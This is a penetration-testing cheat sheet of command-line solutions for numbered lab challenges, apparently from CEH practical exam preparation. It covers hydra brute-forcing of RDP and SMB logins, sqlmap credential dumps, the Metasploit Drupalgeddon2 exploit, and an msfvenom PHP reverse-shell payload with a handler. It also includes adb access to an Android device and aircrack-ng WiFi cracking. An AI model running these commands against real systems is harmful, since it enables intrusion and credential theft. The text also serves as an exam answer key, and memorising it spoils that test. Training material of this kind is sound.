# Ethical-Hacking-Cheatsheet

1. Domain Controller Product Version

Solution 1

nmap --script smb-os-discovery -p 445 <DC-IP>



Solution 2
nmap -p 389 -sV <target_ip>

ldapsearch -h <target_ip> -x -s base

ldapsearch -x -h <target_ip> -b "DC=CEH,DC=com"

nmap -p 389 -T4 -A -v --script ldap-rootdse <subnet>



2. Mercury Services Running
Solution 1
nmap -sV -p 25,80,110,143 <subnet>



Solution 2
nmap -sV -p 25,80,110,143 10.10.1.0/24

nmap -sV -p 25,80,110,143 192.168.0.0/24

nmap -sV -p 25,80,110,143 172.20.0.0/24



3. RDP → hide.cfe → CRC32
Solution 1
nmap -p 3389 --open -sV 10.10.55.0/24

hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.10.55.X

steghide extract -sf hide.cfe -p <JonesPassword>
crc32 image.jpg

Solution 2
ftp <target_ip>
get hide.cfe
steghide extract -sf hide.cfe
crc32 image.jpg

4. Android Hidden Data
Solution 1
nmap -p 80,443,8080,8443,5228 --open 10.10.55.0/24
adb connect 10.10.55.X:5555
adb shell
find /sdcard/ -name "*.jpg" -o -name "*.png"
adb pull /sdcard/Downloads/CEH.jpg
steghide extract -sf ceh.jpg

Solution 2
nmap -p 5555 --open 10.10.55.0/24
adb connect <target_ip>:5555
adb shell
adb pull <image>
steghide extract -sf image.jpg

5. Vulnerability Scan → CVE
Solution 1
OpenVAS

Solution 2
nmap -Pn --script vuln <target_ip>

6. Netnormal.txt
Solution 1
nmap -p 22 --open 10.10.55.0/24
ssh Marcus@10.10.55.X
find / -type f -name Netnormal.txt 2>/dev/null
cat Netnormal.txt

Solution 2
nmap -p 22 --open <subnet>
find / -type f -name Netnormal.txt 2>/dev/null

8. SMB → Sniffer.txt
Solution 1
nmap -p 139,445 --open -sV 10.10.55.0/24
hydra -L user_list.txt -P password_list.txt <ip> smb
smbclient -L \\\\<ip>\\

smbclient \\\\<ip>\\share_name -U user%password

get Sniffer.txt

Solution 2
smbclient -L \\\\<ip>\\

hydra -L users.txt -P passwords.txt <ip> smb
smbclient \\\\<ip>\\share -U username%password

get Sniffer.txt
cat Sniffer.txt

13. cinema.cehorg.com SQL Injection
Solution 1
sqlmap -u "<url>" --cookie="<cookie>" --dbs
sqlmap -u "<url>" --cookie="<cookie>" -D db --tables
sqlmap -u "<url>" --cookie="<cookie>" -D db -T users --columns
sqlmap -u "<url>" --cookie="<cookie>" -D db -T users -C username,password --dump

Solution 2
Login
Inspect
Console
document.cookie
OR
Cookie Editor Extension
Then:
sqlmap -u "<url>" --cookie="<cookie>" --dbs
sqlmap -u "<url>" --cookie="<cookie>" -D db_name --tables
sqlmap -u "<url>" --cookie="<cookie>" -D db_name -T table_name --dump

15. Drupalgeddon2 → Flag.txt
Solution 1
msfconsole
search drupalgeddon2
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOST <ip>
set RPORT 80
run
find / -name Flag.txt 2>/dev/null

Solution 2
zaproxy
Find:
File Upload
File Inclusion
RCE

Generate Payload:
msfvenom -p php/meterpreter/reverse_tcp \
LHOST=<ip> \
LPORT=<port> \
-f raw > exploit.php

Handler:
msfconsole

use exploit/multi/handler

set payload php/meterpreter/reverse_tcp

set LHOST <ip>

set LPORT <port>

run

Upload:
exploit.php

Visit:
http://victim/uploads/exploit.php

Meterpreter:
find / -name Flag.txt 2>/dev/null

cat Flag.txt



16. SQLi Flag Challenge
Solution 1
sqlmap -u url \
--crawl=3 \
--level=5 \
--risk=3 \
--dbs



Solution 2
wapiti -u <url> -m sql

Then:
sqlmap -u <url> --dbs

sqlmap -u <url> -D db_name --tables

sqlmap -u <url> -D db_name -T table_name --columns

sqlmap -u <url> -D db_name -T table_name -C column_name --dump



18. MQTT Topic Length
Solution 1
Wireshark

mqtt.msgtype == 3

Publish Message

Topic Length



Solution 2
Wireshark

Filter:
mqtt.msgtype == 3

Expand:
MQTT

Topic

Count Length



20. WiFi Password Length
Solution 1
airodump-ng W!F!_Pcap.cap

airodump-ng \
--bssid <BSSID> \
--channel <CHANNEL> \
-w outputfile \
W!F!_Pcap.cap

aircrack-ng -w rockyou.txt outputfile-01.cap



Solution 2
aircrack-ng \
-b <BSSID> \
-w rockyou.txt \
capture.cap

Once cracked:
Count Password Length

